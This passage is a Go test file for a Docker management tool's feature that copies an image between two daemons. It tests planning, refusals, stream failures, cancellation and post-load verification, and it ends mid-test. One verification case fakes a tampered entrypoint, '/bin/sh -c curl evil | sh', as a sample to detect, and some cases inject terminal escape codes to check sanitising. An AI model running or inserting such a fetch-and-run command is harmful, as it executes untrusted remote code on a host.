package plan

import (
	"context"
	"errors"
	"io"
	"net/http"
	"os"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/fardani235/docker-desk/internal/engine"
	"github.com/fardani235/docker-desk/internal/fakeengine"
	"github.com/fardani235/docker-desk/internal/forensics/fixture"
	"github.com/fardani235/docker-desk/internal/jobs"
)

const copyRefName = "host.test:5000/acme/api:3.28.3"

var (
	copySrcDaemon = CopyDaemon{Key: "unix:///src.sock", Name: "laptop", Endpoint: "unix:///src.sock", Context: "default"}
	copyDstDaemon = CopyDaemon{Key: "tcp://10.0.0.5:2376", Name: "staging", Endpoint: "tcp://10.0.0.5:2376", Context: "staging", LinkLabel: "REMOTE tcp+tls"}
)

// ---- the plan (2.1) -----------------------------------------------------------------

func copyFacts(id string, layers ...string) engine.ImageFacts {
	return engine.ImageFacts{ID: id, OS: "linux", Architecture: "arm64", Variant: "v8", DiffIDs: layers, Cmd: []string{"/bin/app"}}
}

func hexID(c byte) string { return "sha256:" + strings.Repeat(string(c), 64) }

func TestCopyImagePlan(t *testing.T) {
	id, other := hexID('a'), hexID('b')
	img := engine.Image{ID: id, Size: 42_000_000, RepoTags: []string{copyRefName, "host.test:5000/acme/api@" + hexID('d')}}
	snap := Snapshot{Images: []engine.Image{img, {ID: hexID('c')}}}
	src := CopySource{Daemon: copySrcDaemon, ImageID: id, Ref: copyRefName, Facts: copyFacts(id, "sha256:l1", "sha256:l2")}

	// The tag is new on the target.
	p, err := CopyImage(snap, src, CopyDestination{Daemon: copyDstDaemon})
	if err != nil {
		t.Fatal(err)
	}
	if p.Tier != TierTyped || p.Word != "3.28.3" || !p.Runnable() || len(p.Warnings) != 0 {
		t.Fatalf("tier %v word %q runnable %v warnings %v", p.Tier, p.Word, p.Runnable(), p.Warnings)
	}
	st := p.Steps[0]
	if len(p.Steps) != 1 || st.Op != OpCopyImage || st.ID != copyRefName || st.Pin != id || st.Kind != "image" {
		t.Fatalf("steps %+v", p.Steps)
	}
	c := p.ImageCopy
	if c == nil || c.ImageID != id || c.Ref != copyRefName || c.By() != copyRefName || c.TargetOwner != "" ||
		c.Source != copySrcDaemon || c.Target != copyDstDaemon || c.Platform.String() != "linux/arm64/v8" {
		t.Fatalf("spec %+v", c)
	}
	if p.Target.Name != copyRefName || p.Target.ID != "aaaaaaaaaaaa" || p.JobTitle != "copy image" || p.JobTarget != copyRefName {
		t.Fatalf("identity %+v", p.Target)
	}
	all := strings.Join(p.Effects, "\n")
	for _, s := range []string{
		"image aaaaaaaaaaaa", "platform linux/arm64/v8", "42.0 MB",
		"from laptop to staging.",
		"no file is written on this machine and no registry is contacted",
		copyRefName + " does not exist on staging: the tag is created there",
		"Only this platform is sent", "never retags",
		"still name image aaaaaaaaaaaa on the source",
		"The source is only read",
		"neither can be removed from the session",
		"layers the target already accepted may remain",
		"may give the same build different IDs",
	} {
		if !strings.Contains(all, s) {
			t.Errorf("effects lack %q:\n%s", s, all)
		}
	}

	// The tag names another image on the target: named, warned, recorded.
	p, err = CopyImage(snap, src, CopyDestination{Daemon: copyDstDaemon, Held: true, Facts: copyFacts(other, "sha256:x1")})
	if err != nil || !p.Runnable() || p.Word != "3.28.3" || p.ImageCopy.TargetOwner != other {
		t.Fatalf("moved: %v runnable %v spec %+v", err, p.Runnable(), p.ImageCopy)
	}
	if w := strings.Join(p.Warnings, "\n"); !strings.Contains(w, copyRefName+" names image bbbbbbbbbbbb on staging") || !strings.Contains(w, "moves the tag") {
		t.Fatalf("warnings %q", w)
	}

	// The target already holds the same build, under whatever ID.
	p, err = CopyImage(snap, src, CopyDestination{Daemon: copyDstDaemon, Held: true, Facts: copyFacts(other, "sha256:l1", "sha256:l2")})
	if err != nil || p.Runnable() || len(p.Blockers) != 1 || !strings.Contains(p.Blockers[0], "Already present") || !strings.Contains(p.Blockers[0], "bbbbbbbbbbbb") {
		t.Fatalf("already present: %v %+v", err, p.Blockers)
	}

	// The target could not be read.
	p, err = CopyImage(snap, src, CopyDestination{Daemon: copyDstDaemon, Err: "connection refused\x1b[2J"})
	if err != nil || p.Runnable() || len(p.Blockers) != 1 || !strings.Contains(p.Blockers[0], "could not be read") ||
		!strings.Contains(p.Blockers[0], "Nothing was sent") || strings.Contains(p.Blockers[0], "\x1b") {
		t.Fatalf("unreadable target: %v %q", err, p.Blockers)
	}

	// The target holds the name under an ID that cannot be checked again.
	p, _ = CopyImage(snap, src, CopyDestination{Daemon: copyDstDaemon, Held: true, Facts: copyFacts("weird-id", "sha256:x")})
	if p.Runnable() || !strings.Contains(strings.Join(p.Blockers, ""), "not a sha256 digest") {
		t.Fatalf("odd target id: %+v", p.Blockers)
	}

	// An untagged row: by ID, arrives untagged, the word is the short ID.
	un := CopySource{Daemon: copySrcDaemon, ImageID: hexID('c'), Facts: copyFacts(hexID('c'), "sha256:l1")}
	p, err = CopyImage(snap, un, CopyDestination{Daemon: copyDstDaemon})
	if err != nil || p.Word != "cccccccccccc" || p.ImageCopy.Ref != "" || p.ImageCopy.By() != hexID('c') || p.Steps[0].ID != hexID('c') ||
		!strings.Contains(strings.Join(p.Effects, "\n"), "arrives untagged") {
		t.Fatalf("untagged: %v %+v", err, p)
	}
	// The target answers for that ID with the same build: already present.
	p, _ = CopyImage(snap, un, CopyDestination{Daemon: copyDstDaemon, Held: true, Facts: copyFacts(hexID('c'), "sha256:l1")})
	if p.Runnable() || !strings.Contains(strings.Join(p.Blockers, ""), "Already present") {
		t.Fatalf("untagged, present: %+v", p.Blockers)
	}

	// A digest reference names content, not a tag: by ID, untagged.
	dg := src
	dg.Ref = "host.test:5000/acme/api@" + hexID('d')
	p, err = CopyImage(snap, dg, CopyDestination{Daemon: copyDstDaemon})
	if err != nil || p.Word != "aaaaaaaaaaaa" || p.ImageCopy.Ref != "" || p.Steps[0].ID != id {
		t.Fatalf("digest row: %v %+v", err, p.ImageCopy)
	}

	// Insecure links are warned about, for each end.
	insSrc, insDst := src, CopyDestination{Daemon: copyDstDaemon}
	insSrc.Daemon.Insecure, insSrc.Daemon.LinkLabel = true, "REMOTE tcp, NO TLS"
	insDst.Daemon.Insecure, insDst.Daemon.LinkLabel = true, "REMOTE tcp, TLS NOT VERIFIED"
	p, _ = CopyImage(snap, insSrc, insDst)
	if w := strings.Join(p.Warnings, "\n"); !p.Runnable() || len(p.Warnings) != 2 ||
		!strings.Contains(w, "NO TLS") || !strings.Contains(w, "read from") || !strings.Contains(w, "TLS NOT VERIFIED") || !strings.Contains(w, "written to") {
		t.Fatalf("insecure warnings: %q", w)
	}

	// No platform reported: said, not hidden.
	np := src
	np.Facts.OS, np.Facts.Architecture, np.Facts.Variant = "", "", ""
	p, _ = CopyImage(snap, np, CopyDestination{Daemon: copyDstDaemon})
	if !strings.Contains(strings.Join(p.Warnings, ""), "reported no platform") {
		t.Fatalf("no platform: %q", p.Warnings)
	}
}

func TestCopyImagePlanRefusals(t *testing.T) {
	id := hexID('a')
	snap := Snapshot{Images: []engine.Image{
		{ID: id, RepoTags: []string{copyRefName, "acme/api"}},
		{ID: "not-a-digest", RepoTags: []string{"odd:1"}},
	}}
	dst := CopyDestination{Daemon: copyDstDaemon}
	base := CopySource{Daemon: copySrcDaemon, ImageID: id, Ref: copyRefName, Facts: copyFacts(id, "sha256:l1")}
	for name, c := range map[string]struct {
		mut  func(*CopySource, *CopyDestination)
		want string
	}{
		"gone":            {func(s *CopySource, _ *CopyDestination) { s.ImageID = hexID('f') }, "no longer exists"},
		"odd id":          {func(s *CopySource, _ *CopyDestination) { s.ImageID, s.Ref = "not-a-digest", "odd:1" }, "not a sha256 digest"},
		"not its ref":     {func(s *CopySource, _ *CopyDestination) { s.Ref = "other:1" }, "no longer a reference"},
		"not normalised":  {func(s *CopySource, _ *CopyDestination) { s.Ref = "acme/api" }, "can name exactly"},
		"another image":   {func(s *CopySource, _ *CopyDestination) { s.Facts.ID = hexID('e') }, "answered for another image"},
		"the same daemon": {func(_ *CopySource, d *CopyDestination) { d.Daemon = copySrcDaemon }, "two different daemons"},
	} {
		s, d := base, dst
		c.mut(&s, &d)
		_, err := CopyImage(snap, s, d)
		var na *NotApplicable
		if !errors.As(err, &na) || !strings.Contains(na.Reason, c.want) || !strings.Contains(na.Reason, "nothing was sent") {
			t.Errorf("%s: %v", name, err)
		}
	}
	// A daemon without a key is a programming error, not a refusal to show.
	s := base
	s.Daemon.Key = ""
	if _, err := CopyImage(snap, s, dst); err == nil || !strings.Contains(err.Error(), "internal error") {
		t.Fatalf("no key: %v", err)
	}
}

func TestSameBuild(t *testing.T) {
	a := copyFacts(hexID('a'), "sha256:l1", "sha256:l2")
	a.Labels = map[string]string{"k": "v"}
	a.EnvNames = []string{"PATH"}
	b := a
	b.ID = hexID('b') // another store's name for it
	b.Labels = map[string]string{"k": "v"}
	if d := SameBuild(a, b); d != "" {
		t.Fatalf("the same build under two IDs: %q", d)
	}
	// nil and empty are the same nothing.
	e1, e2 := a, a
	e1.Entrypoint, e2.Entrypoint = nil, []string{}
	e1.Labels, e2.Labels = nil, map[string]string{}
	if d := SameBuild(e1, e2); d != "" {
		t.Fatalf("nil against empty: %q", d)
	}
	for name, c := range map[string]struct {
		mut  func(*engine.ImageFacts)
		want string
	}{
		"platform":       {func(f *engine.ImageFacts) { f.Architecture, f.Variant = "amd64", "" }, "the platform is linux/amd64, not linux/arm64/v8"},
		"a layer":        {func(f *engine.ImageFacts) { f.DiffIDs = []string{"sha256:l1", "sha256:zz"} }, "layer 2 is zz, not l2"},
		"fewer layers":   {func(f *engine.ImageFacts) { f.DiffIDs = []string{"sha256:l1"} }, "layer 2 is none, not l2 (1 layers, the source has 2)"},
		"more layers":    {func(f *engine.ImageFacts) { f.DiffIDs = append([]string{}, "sha256:l1", "sha256:l2", "sha256:l3") }, "layer 3 is l3, not none"},
		"layer order":    {func(f *engine.ImageFacts) { f.DiffIDs = []string{"sha256:l2", "sha256:l1"} }, "layer 1 is l2, not l1"},
		"command":        {func(f *engine.ImageFacts) { f.Cmd = []string{"/bin/sh"} }, "the command differs"},
		"entrypoint":     {func(f *engine.ImageFacts) { f.Entrypoint = []string{"/x"} }, "the entrypoint differs"},
		"user":           {func(f *engine.ImageFacts) { f.User = "0" }, "the user differs"},
		"env":            {func(f *engine.ImageFacts) { f.EnvNames = []string{"PATH", "LD_PRELOAD"} }, "environment variables differs"},
		"labels":         {func(f *engine.ImageFacts) { f.Labels = map[string]string{"k": "other"} }, "labels differs"},
		"ports":          {func(f *engine.ImageFacts) { f.ExposedPorts = []string{"22/tcp"} }, "exposed ports differs"},
		"hostile layers": {func(f *engine.ImageFacts) { f.DiffIDs = []string{"\x1b[2J"} }, `\x1b`},
	} {
		got := a
		got.Labels = map[string]string{"k": "v"}
		c.mut(&got)
		if d := SameBuild(a, got); !strings.Contains(d, c.want) || strings.Contains(d, "\x1b") {
			t.Errorf("%s: %q, want %q", name, d, c.want)
		}
	}
}

// ---- the executor (2.2–2.4) ---------------------------------------------------------

// copyFixture is the image the copy tests move: one layer large enough to
// cross the daemons in many pieces.
func copyFixture(ref string) fixture.Image {
	f := fixture.ChangesReport(ref, true)
	f.Architecture, f.Variant = "arm64", "v8"
	if ref == "" {
		f.RepoTags = nil
	}
	body := make([]byte, 1<<20)
	for i := range body {
		body[i] = byte(i * 7)
	}
	f.Layers = append(f.Layers, fixture.Layer{CreatedBy: "COPY big /big", Files: []fixture.File{{Path: "big", Body: body}}})
	return f
}

type imgCopyRig struct {
	t        *testing.T
	src, dst *rig
	jm       *jobs.Manager
	// srcEng and dstEng are what ExecuteCopy is given; tests wrap them.
	srcEng, dstEng engine.Engine
	imageID        string
}

// newImgCopyRig starts two fake daemons, the first holding the fixture under
// ref ("" for an untagged image).
func newImgCopyRig(t *testing.T, ref string, seedDst func(*fakeengine.Server)) *imgCopyRig {
	t.Helper()
	var id string
	src := newRig(t, func(s *fakeengine.Server) {
		if ref == "" {
			id = s.AddImage(0, time.Hour)
		} else {
			id = s.AddImage(0, time.Hour, ref, "acme/api:other")
		}
		s.SetImageFixture(id, copyFixture(ref))
		s.AddImage(1000, time.Hour, "bystander:1")
	})
	dst := newRig(t, func(s *fakeengine.Server) {
		s.AddImage(1000, time.Hour, "resident:1")
		if seedDst != nil {
			seedDst(s)
		}
	})
	return &imgCopyRig{t: t, src: src, dst: dst, jm: src.jm, srcEng: src.eng, dstEng: dst.eng, imageID: "sha256:" + id}
}

// plan makes the two reads the dialog makes and builds the plan.
func (c *imgCopyRig) plan(ref string) Plan {
	c.t.Helper()
	ctx := context.Background()
	facts, err := c.src.eng.ImageFacts(ctx, c.imageID)
	if err != nil {
		c.t.Fatal(err)
	}
	source := CopySource{Daemon: copySrcDaemon, ImageID: c.imageID, Ref: ref, Facts: facts}
	dest := CopyDestination{Daemon: copyDstDaemon}
	name := ref
	if name == "" {
		name = c.imageID
	}
	switch held, err := c.dst.eng.ImageFacts(ctx, name); {
	case err == nil:
		dest.Held, dest.Facts = true, held
	case !engine.IsNotFound(err):
		dest.Err = err.Error()
	}
	p, err := CopyImage(c.src.snap(), source, dest)
	if err != nil {
		c.t.Fatal(err)
	}
	c.src.srv.ResetRequests()
	c.dst.srv.ResetRequests()
	return p
}

func (c *imgCopyRig) run(p Plan) jobs.Job {
	c.t.Helper()
	id, err := c.jm.StartOnPair(p.ImageCopy.Target.Key, p.ImageCopy.Source.Key, p.JobTitle, p.JobTarget, func(ctx context.Context, run *jobs.Run) error {
		return ExecuteCopy(ctx, c.srcEng, c.dstEng, p, run)
	})
	if err != nil {
		c.t.Fatal(err)
	}
	c.jm.Wait()
	j, _ := c.jm.Get(id)
	return j
}

// sourceUntouched fails the test if the source received anything but GETs,
// or holds other images or references than before.
func (c *imgCopyRig) sourceUntouched(refs, ids []string) {
	c.t.Helper()
	if m := c.src.srv.Mutations(); len(m) != 0 {
		c.t.Fatalf("the source received mutating requests: %v", m)
	}
	if got := c.src.srv.ImageRefs(); strings.Join(got, ",") != strings.Join(refs, ",") {
		c.t.Fatalf("the source's references changed: %v, were %v", got, refs)
	}
	if got := c.src.srv.ImageIDs(); strings.Join(got, ",") != strings.Join(ids, ",") {
		c.t.Fatalf("the source's images changed: %v, were %v", got, ids)
	}
}

func (c *imgCopyRig) loads() int { return c.dst.srv.CountRequests(http.MethodPost, `^/images/load$`) }

func noControl(t *testing.T, j jobs.Job) {
	t.Helper()
	for _, s := range append(append([]string{}, j.Log...), j.Err, j.Status) {
		if strings.ContainsAny(s, "\x1b\r\n\x07") {
			t.Fatalf("a control character reached the job's text: %q", s)
		}
	}
}

func TestExecuteCopySuccess(t *testing.T) {
	c := newImgCopyRig(t, copyRefName, nil)
	p := c.plan(copyRefName)
	srcRefs, srcIDs := c.src.srv.ImageRefs(), c.src.srv.ImageIDs()

	// Nothing may be written on this machine: the job runs with a
	// temporary directory, a home and a working directory of its own, all
	// one empty folder, and leaves it empty (2.4, D1).
	box := t.TempDir()
	t.Setenv("TMPDIR", box)
	t.Setenv("HOME", box)
	t.Chdir(box)

	j := c.run(p)
	log := logText(j)
	if j.State != jobs.Succeeded {
		t.Fatalf("job %+v\n%s", j, log)
	}
	if left, _ := os.ReadDir(box); len(left) != 0 {
		t.Fatalf("the copy left files on this machine: %v", left)
	}

	// The request set (2.4): the source is asked for the pin and for one
	// archive; the target for its state, one load and the verification.
	if n := c.src.srv.CountRequests(http.MethodGet, `^/images/get$`); n != 1 {
		t.Fatalf("%d archive requests on the source, want 1: %v", n, c.src.srv.Requests())
	}
	for _, r := range c.src.srv.Requests() {
		if r.Path == "/images/get" && (!strings.Contains(r.Query, "arm64") || !strings.Contains(r.Query, "names="+strings.ReplaceAll(strings.ReplaceAll(copyRefName, ":", "%3A"), "/", "%2F"))) {
			t.Fatalf("the archive request: %s", r)
		}
	}
	c.sourceUntouched(srcRefs, srcIDs)
	if m := c.dst.srv.Mutations(); len(m) != 1 || m[0].Path != "/images/load" || m[0].Method != http.MethodPost {
		t.Fatalf("the target's mutations: %v", m)
	}
	var after []string
	seenLoad := false
	for _, r := range c.dst.srv.Requests() {
		if r.Path == "/images/load" {
			seenLoad = true
		} else if seenLoad {
			after = append(after, r.String())
		}
	}
	if len(after) != 2 || !strings.HasSuffix(after[0], "/json") || !strings.HasSuffix(after[1], "/history") {
		t.Fatalf("after the load the target was asked %v, want one inspect and its history", after)
	}
	for _, srv := range []*fakeengine.Server{c.src.srv, c.dst.srv} {
		for _, r := range srv.Requests() {
			if strings.Contains(r.Path, "/push") || strings.Contains(r.Path, "/distribution") || r.Path == "/images/create" || r.Path == "/auth" {
				t.Fatalf("a registry request was made: %s", r)
			}
		}
	}

	// The image is on the target, under the tag, as the same build.
	want, _ := c.src.eng.ImageFacts(context.Background(), copyRefName)
	got, err := c.dst.eng.ImageFacts(context.Background(), copyRefName)
	if err != nil || SameBuild(want, got) != "" {
		t.Fatalf("the target's image: %v, %s", err, SameBuild(want, got))
	}
	if got.ID == want.ID {
		t.Fatal("the two fake stores were expected to name the build differently")
	}
	reqs := c.dst.srv.LoadRequests()
	if len(reqs) != 1 || !strings.Contains(reqs[0].Platform, "arm64") || reqs[0].Bytes < 1<<20 || len(reqs[0].MovedFrom) != 0 {
		t.Fatalf("load requests %+v", reqs)
	}
	if !c.dst.srv.HasImage("resident:1") {
		t.Fatal("the target lost an image it had")
	}
	for _, s := range []string{
		"pinned to " + engine.ShortID(c.imageID), "platform linux/arm64/v8",
		"from laptop (unix:///src.sock)", "to   staging (tcp://10.0.0.5:2376)",
		"target: Loaded image: " + copyRefName,
		"✓ copy image " + copyRefName + " done", "streamed, platform linux/arm64/v8",
		"verified on the target: the same 6 layers, platform and config",
		"source image " + engine.ShortID(c.imageID), "target image " + engine.ShortID(got.ID),
		"name this build differently",
		copyRefName + " was created on the target",
		CopySourceNote,
	} {
		if !strings.Contains(log, s) {
			t.Errorf("log lacks %q:\n%s", s, log)
		}
	}
	if !strings.HasPrefix(j.Status, "copied ") || j.From != copySrcDaemon.Key || j.Daemon != copyDstDaemon.Key {
		t.Fatalf("job %+v", j)
	}
	noControl(t, j)
}

func TestExecuteCopyUntagged(t *testing.T) {
	c := newImgCopyRig(t, "", nil)
	p := c.plan("")
	if p.Word != engine.ShortID(c.imageID) {
		t.Fatalf("word %q", p.Word)
	}
	j := c.run(p)
	log := logText(j)
	if j.State != jobs.Succeeded || !strings.Contains(log, "untagged on the target") || !strings.Contains(log, "target: Loaded image ID: sha256:") {
		t.Fatalf("job %+v\n%s", j, log)
	}
	// The target named it by its own ID, and gave it no reference.
	reqs := c.dst.srv.LoadRequests()
	if len(reqs) != 1 || len(reqs[0].Refs) != 0 || reqs[0].ImageID == "" || "sha256:"+reqs[0].ImageID == c.imageID {
		t.Fatalf("load %+v", reqs)
	}
	if got := c.dst.srv.ImageRefs(); strings.Join(got, ",") != "resident:1" {
		t.Fatalf("the target's references: %v", got)
	}
}

func TestExecuteCopyMovesTheTargetTag(t *testing.T) {
	var old string
	c := newImgCopyRig(t, copyRefName, func(s *fakeengine.Server) { old = s.AddImage(5000, time.Hour, copyRefName, "keeps:1") })
	p := c.plan(copyRefName)
	if p.ImageCopy.TargetOwner != "sha256:"+old || len(p.Warnings) != 1 {
		t.Fatalf("spec %+v warnings %v", p.ImageCopy, p.Warnings)
	}
	j := c.run(p)
	log := logText(j)
	if j.State != jobs.Succeeded {
		t.Fatalf("job %+v\n%s", j, log)
	}
	if got := c.dst.srv.LoadRequests()[0].MovedFrom[copyRefName]; got != old {
		t.Fatalf("moved from %q, want %s", got, old)
	}
	if !strings.Contains(log, copyRefName+" moved on the target: from image "+old[:12]) || !c.dst.srv.HasImage("keeps:1") {
		t.Fatalf("log:\n%s", log)
	}
}

func TestExecuteCopyRefusesBeforeTheStream(t *testing.T) {
	for name, tc := range map[string]struct {
		change func(c *imgCopyRig)
		want   string
	}{
		"the source tag moved": {func(c *imgCopyRig) { c.src.srv.MoveTag(copyRefName, 100) }, "the tag moved"},
		"the source image is gone": {func(c *imgCopyRig) { c.src.srv.Untag(copyRefName) },
			"no longer exists on the source"},
		"the source cannot be read": {func(c *imgCopyRig) {
			c.src.srv.FailNext(http.MethodGet, `/json$`, 500, "driver failed", 1)
		}, "the source laptop (unix:///src.sock) could not be read: driver failed"},
		"the target gained the tag": {func(c *imgCopyRig) { c.dst.srv.AddImage(100, 0, copyRefName) }, "the target changed"},
		"the target cannot be read": {func(c *imgCopyRig) {
			c.dst.srv.FailNext(http.MethodGet, `/json$`, 500, "driver failed", 1)
		}, "the target staging (tcp://10.0.0.5:2376) could not be read: driver failed"},
		"the source refuses the archive": {func(c *imgCopyRig) {
			c.src.srv.FailNext(http.MethodGet, `^/images/get$`, 500, "export failed", 1)
		}, "did not give the archive: export failed"},
	} {
		t.Run(name, func(t *testing.T) {
			c := newImgCopyRig(t, copyRefName, nil)
			p := c.plan(copyRefName)
			tc.change(c)
			c.src.srv.ResetRequests()
			c.dst.srv.ResetRequests()
			dstIDs := c.dst.srv.ImageIDs()
			j := c.run(p)
			log := logText(j)
			if j.State != jobs.Failed || !strings.Contains(j.Err, tc.want) || !strings.Contains(j.Err, "nothing was copied") {
				t.Fatalf("job %v %q\n%s", j.State, j.Err, log)
			}
			if c.loads() != 0 || len(c.dst.srv.Mutations()) != 0 || len(c.src.srv.Mutations()) != 0 {
				t.Fatalf("requests were sent: target %v, source %v", c.dst.srv.Mutations(), c.src.srv.Mutations())
			}
			if strings.Join(c.dst.srv.ImageIDs(), ",") != strings.Join(dstIDs, ",") {
				t.Fatal("the target's images changed")
			}
			if !strings.Contains(log, "nothing was sent to the target") || !strings.Contains(log, CopySourceNote) {
				t.Fatalf("log:\n%s", log)
			}
		})
	}
}

// TestExecuteCopyTargetTagMovedAway: the dialog showed the target's tag on
// one image; by the job it names another, or none.
func TestExecuteCopyTargetChangedFromTheDialog(t *testing.T) {
	for name, change := range map[string]func(s *fakeengine.Server){
		"names another image": func(s *fakeengine.Server) { s.MoveTag(copyRefName, 77) },
		"names no image":      func(s *fakeengine.Server) { s.Untag(copyRefName) },
	} {
		c := newImgCopyRig(t, copyRefName, func(s *fakeengine.Server) { s.AddImage(5000, time.Hour, copyRefName) })
		p := c.plan(copyRefName)
		change(c.dst.srv)
		j := c.run(p)
		if j.State != jobs.Failed || !strings.Contains(j.Err, "the target changed") || c.loads() != 0 {
			t.Fatalf("%s: %v %q, %d loads", name, j.State, j.Err, c.loads())
		}
	}
}

// brokenSource is a source whose archive stream fails after n bytes.
type brokenSource struct {
	engine.Engine
	after int64
}

type failingReader struct {
	rc    io.ReadCloser
	left  int64
	fails error
}

func (f *failingReader) Read(p []byte) (int, error) {
	if f.left <= 0 {
		return 0, f.fails
	}
	if int64(len(p)) > f.left {
		p = p[:f.left]
	}
	n, err := f.rc.Read(p)
	f.left -= int64(n)
	return n, err
}
func (f *failingReader) Close() error { return f.rc.Close() }

func (b *brokenSource) SaveImage(ctx context.Context, id string, p engine.Platform) (io.ReadCloser, error) {
	rc, err := b.Engine.SaveImage(ctx, id, p)
	if err != nil {
		return nil, err
	}
	return &failingReader{rc: rc, left: b.after, fails: errors.New("unexpected EOF\x1b[31m from the daemon")}, nil
}

func TestExecuteCopySourceFailsMidStream(t *testing.T) {
	c := newImgCopyRig(t, copyRefName, nil)
	p := c.plan(copyRefName)
	c.srcEng = &brokenSource{Engine: c.src.eng, after: 300_000}
	dstIDs := c.dst.srv.ImageIDs()
	j := c.run(p)
	log := logText(j)
	if j.State != jobs.Failed || !strings.Contains(j.Err, "the source laptop (unix:///src.sock) stopped sending the archive after") {
		t.Fatalf("job %v %q\n%s", j.State, j.Err, log)
	}
	if strings.Join(c.dst.srv.ImageIDs(), ",") != strings.Join(dstIDs, ",") || c.dst.srv.HasImage(copyRefName) {
		t.Fatal("a broken stream produced an image on the target")
	}
	for _, s := range []string{"the target's request was closed", "no image and no moved tag is claimed", "layers it already accepted may remain", CopySourceNote} {
		if !strings.Contains(log, s) {
			t.Errorf("log lacks %q:\n%s", s, log)
		}
	}
	noControl(t, j)
}

func TestExecuteCopyTargetFails(t *testing.T) {
	for name, tc := range map[string]struct {
		arm  func(s *fakeengine.Server)
		want string
	}{
		"refused": {func(s *fakeengine.Server) {
			s.FailNext(http.MethodPost, `^/images/load$`, 500, "invalid tar header", 1)
		}, "invalid tar header"},
		"in stream": {func(s *fakeengine.Server) { s.FailLoad("write /var/lib/docker/tmp: no space left on device") }, "no space left on device"},
	} {
		t.Run(name, func(t *testing.T) {
			c := newImgCopyRig(t, copyRefName, nil)
			p := c.plan(copyRefName)
			tc.arm(c.dst.srv)
			srcRefs, srcIDs := c.src.srv.ImageRefs(), c.src.srv.ImageIDs()
			j := c.run(p)
			log := logText(j)
			if j.State != jobs.Failed || !strings.Contains(j.Err, "the target staging (tcp://10.0.0.5:2376) refused or failed the load") || !strings.Contains(j.Err, tc.want) {
				t.Fatalf("job %v %q\n%s", j.State, j.Err, log)
			}
			if c.dst.srv.HasImage(copyRefName) || !strings.Contains(log, "the source's stream was closed") || !strings.Contains(log, "no image and no moved tag is claimed") {
				t.Fatalf("log:\n%s", log)
			}
			c.sourceUntouched(srcRefs, srcIDs)
		})
	}
}

// TestExecuteCopyTargetDisconnects stops the target daemon while it reads
// the archive: the job names the target and how far the stream had got.
func TestExecuteCopyTargetDisconnects(t *testing.T) {
	c := newImgCopyRig(t, copyRefName, nil)
	c.dst.srv.LoadChunkDelay = 10 * time.Millisecond
	p := c.plan(copyRefName)
	go func() {
		deadline := time.Now().Add(5 * time.Second)
		for c.loads() == 0 && time.Now().Before(deadline) {
			time.Sleep(2 * time.Millisecond)
		}
		time.Sleep(30 * time.Millisecond)
		c.dst.srv.Stop()
	}()
	j := c.run(p)
	log := logText(j)
	if j.State != jobs.Failed || !strings.Contains(j.Err, "the target staging (tcp://10.0.0.5:2376) became unreachable during the load after") ||
		!strings.Contains(j.Err, "were streamed") {
		t.Fatalf("job %v %q\n%s", j.State, j.Err, log)
	}
	if !strings.Contains(log, "no image and no moved tag is claimed") {
		t.Fatalf("log:\n%s", log)
	}
}

func TestExecuteCopyCancel(t *testing.T) {
	c := newImgCopyRig(t, copyRefName, nil)
	c.dst.srv.LoadChunkDelay = 10 * time.Millisecond
	c.src.srv.ExportChunkDelay = time.Millisecond
	p := c.plan(copyRefName)
	srcRefs, srcIDs := c.src.srv.ImageRefs(), c.src.srv.ImageIDs()
	id, err := c.jm.StartOnPair(copyDstDaemon.Key, copySrcDaemon.Key, p.JobTitle, p.JobTarget, func(ctx context.Context, run *jobs.Run) error {
		return ExecuteCopy(ctx, c.srcEng, c.dstEng, p, run)
	})
	if err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if j, _ := c.jm.Get(id); strings.HasPrefix(j.Status, "streamed ") && j.Status != "streamed 0 B" {
			break
		}
		time.Sleep(2 * time.Millisecond)
	}
	if !c.jm.Cancel(id) {
		t.Fatal("the job was not running")
	}
	c.jm.Wait()
	j, _ := c.jm.Get(id)
	log := logText(j)
	if j.State != jobs.Cancelled || !strings.Contains(log, CopyCancelledNote) || !strings.Contains(log, "were streamed before the cancel") || !strings.Contains(log, CopySourceNote) {
		t.Fatalf("job %v %q\n%s", j.State, j.Err, log)
	}
	// Both streams are closed: the target saw its request end without the
	// whole archive and registered nothing.
	for len(c.dst.srv.LoadRequests()) == 0 && time.Now().Before(deadline) {
		time.Sleep(2 * time.Millisecond)
	}
	reqs := c.dst.srv.LoadRequests()
	if len(reqs) != 1 || reqs[0].Err == "" || reqs[0].ImageID != "" || c.dst.srv.HasImage(copyRefName) {
		t.Fatalf("the target after a cancel: %+v", reqs)
	}
	c.sourceUntouched(srcRefs, srcIDs)
	if strings.Contains(log, "✓") || strings.Contains(log, "verified") {
		t.Fatalf("a cancelled copy claimed success:\n%s", log)
	}
}

// lyingTarget is a target whose answers after the load are not the truth of
// its store: for the verification's refusals.
type lyingTarget struct {
	engine.Engine
	loaded atomic.Bool
	after  func(f engine.ImageFacts, err error) (engine.ImageFacts, error)
	text   string // an extra line "the daemon" says during the load
}

func (l *lyingTarget) LoadImage(ctx context.Context, r io.Reader, p engine.Platform, progress func(engine.LoadProgress)) (engine.LoadResult, error) {
	if l.text != "" {
		progress(engine.LoadProgress{Text: l.text})
		progress(engine.LoadProgress{Status: l.text, ID: l.text})
	}
	res, err := l.Engine.LoadImage(ctx, r, p, progress)
	l.loaded.Store(err == nil)
	return res, err
}

func (l *lyingTarget) ImageFacts(ctx context.Context, id string) (engine.ImageFacts, error) {
	f, err := l.Engine.ImageFacts(ctx, id)
	if l.loaded.Load() && l.after != nil {
		return l.after(f, err)
	}
	return f, err
}

func TestExecuteCopyVerification(t *testing.T) {
	for name, tc := range map[string]struct {
		after func(f engine.ImageFacts, err error) (engine.ImageFacts, error)
		want  string
	}{
		"another layer chain": {func(f engine.ImageFacts, err error) (engine.ImageFacts, error) {
			f.DiffIDs = append([]string{}, f.DiffIDs[:len(f.DiffIDs)-1]...)
			return f, err
		}, "holds another image as " + copyRefName + " after the load"},
		"another platform": {func(f engine.ImageFacts, err error) (engine.ImageFacts, error) {
			f.Architecture, f.Variant = "amd64", ""
			return f, err
		}, "the platform is linux/amd64, not linux/arm64/v8"},
		"another config": {func(f engine.ImageFacts, err error) (engine.ImageFacts, error) {
			f.Entrypoint = []string{"/bin/sh", "-c", "curl evil | sh"}
			return f, err
		}, "the entrypoint differs"},
		"nothing there": {func(engine.ImageFacts, error) (engine.ImageFacts, error) {
			return engine.ImageFacts{}, &engine.Error{Kind: engine.KindNotFound, Msg: "No such image"}
		}, "the load did not produce the image"},
		"unreadable": {func(engine.ImageFacts, error) (engine.ImageFacts, error) {
